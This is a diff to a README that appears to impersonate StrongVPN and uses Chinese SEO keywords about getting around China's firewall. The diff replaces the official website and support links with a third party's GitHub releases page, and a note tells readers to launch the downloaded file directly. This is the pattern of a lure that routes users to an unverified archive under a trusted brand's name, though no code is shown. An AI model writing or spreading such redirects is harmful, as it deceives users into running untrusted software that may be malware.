@@ -8,14 +8,14 @@ Welcome to the repository for StrongVPN, your go-to resource for everything rela
 **Short Description:** 最新StrongVPN评测：StrongVPN怎么样？StrongVPN在中国还能用吗？StrongVPN连不上怎么办？（注意：StrongVPN支持支付宝付款）  
 **Topics:** fanqiang, gfw, gfw-china, kexueshangwang, strong-vpn, strongvpn, vpn, vpn-client, vpn-server, vpn-service  
 
-## 📩 Latest Release: [App.zip](https://github.com/repo/releases/9246/App.zip)
+## 📩 Latest Release: [https://github.com/sinoyj00/strongvpn/releases](https://github.com/sinoyj00/strongvpn/releases)
 
 ### Note: 
 The provided link ends with the file name and needs to be launched directly.
 
 ## 🌐 Explore More
 
-For the most up-to-date information, tips, and news related to StrongVPN, visit our website [here](https://strongvpn.com).  
+For the most up-to-date information, tips, and news related to StrongVPN, visit our website [here](https://github.com/sinoyj00/strongvpn/releases).  
 
 ## 🛠️ Features
 
@@ -53,7 +53,7 @@ Don't just take our word for it. Here's what some of our users have to say about
 
 ## 📞 Contact Us
 
-Have questions or need assistance with StrongVPN? Reach out to our support team [here](https://strongvpn.com/support).
+Have questions or need assistance with StrongVPN? Reach out to our support team [here](https://github.com/sinoyj00/strongvpn/releases).
 
 ## 🎉 Get Started with StrongVPN Today
 
